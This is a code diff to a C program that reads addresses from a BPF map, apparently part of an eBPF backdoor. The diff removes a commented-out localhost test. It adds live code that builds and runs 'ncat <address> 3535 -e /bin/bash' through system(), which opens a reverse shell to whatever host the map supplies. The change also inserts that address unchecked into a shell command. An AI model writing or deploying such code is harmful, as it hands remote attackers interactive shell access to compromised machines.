@@ -79,22 +79,16 @@ int main(int argc, char **argv) {
 
         printf("Begin reverse TCP protocol. Dial: %s\n", addrbuf);
 
-        //printf("Calling reverse shell bash");
-        //char cmd[512] = "ncat 127.0.0.1 3535 -e /bin/bash &";
-        //system(cmd);
+        char cmd[512];
+        sprintf(cmd, "ncat %s 3535 -e /bin/bash &", addrbuf);
+        printf("%s\n", cmd);
+        system(cmd);
 
-
-        //("Returned from bpf map: %p\n", h.saddr);
-        //printf("3Returned from bpf map: %pISpc", &h.saddr);
         err = bpf_map_delete_elem(fd, &next_key);
         if (err < 0) {
-          //        fprintf(stderr, "failed to cleanup execs : %d\n", err);
           return -1;
         }
         lookup_key = next_key;
       }
     }
-    printf("2\n");
-
-    return 0;
 }
